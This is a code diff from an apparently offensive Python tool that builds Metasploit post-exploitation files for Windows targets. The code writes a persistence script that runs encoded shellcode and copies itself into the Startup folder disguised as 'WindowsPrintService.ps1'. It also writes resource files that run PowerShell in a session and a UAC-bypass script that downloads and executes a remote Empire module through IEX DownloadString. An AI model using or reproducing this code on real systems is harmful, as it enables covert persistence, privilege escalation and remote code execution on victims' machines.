@@ -20,12 +20,12 @@ class EXTRAS(object):
                               base64.b64encode(self.injectshellcode_sleep.encode('utf_16_le')) + '\"\'; iex $persist; echo $persist > \"$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsPrintService.ps1\"')
             persistfile.close()
         with open('persist.rc', 'w') as persistfilerc:
-            persistfilerc.write("""run post/windows/manage/priv_migrate SESSION=1\nrun post/windows/manage/exec_powershell SCRIPT=persist.ps1 SESSION=1""")
+            persistfilerc.write("""run post/windows/manage/exec_powershell SCRIPT=persist.ps1 SESSION=1""")
             persistfilerc.close()
             return self.ez2read_shellcode
 
     def UACBYPASS(self):
-        uacbypassrcfilecontents = """run post/windows/manage/priv_migrate SESSION=1\nrun post/windows/manage/exec_powershell SCRIPT=bypassuac.ps1 SESSION=1"""
+        uacbypassrcfilecontents = """run post/windows/manage/exec_powershell SCRIPT=bypassuac.ps1 SESSION=1"""
         uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("https://github.com/PowerShellEmpire/Empire/raw/master/data/module_source/privesc/Invoke-BypassUAC.ps1");\nInvoke-BypassUAC -Command \"powershell -enc %s\" """ % (
             base64.b64encode(self.injectshellcode_nosleep.encode('utf_16_le')))
         with open('bypassuac.ps1', 'w') as uacbypassfile:
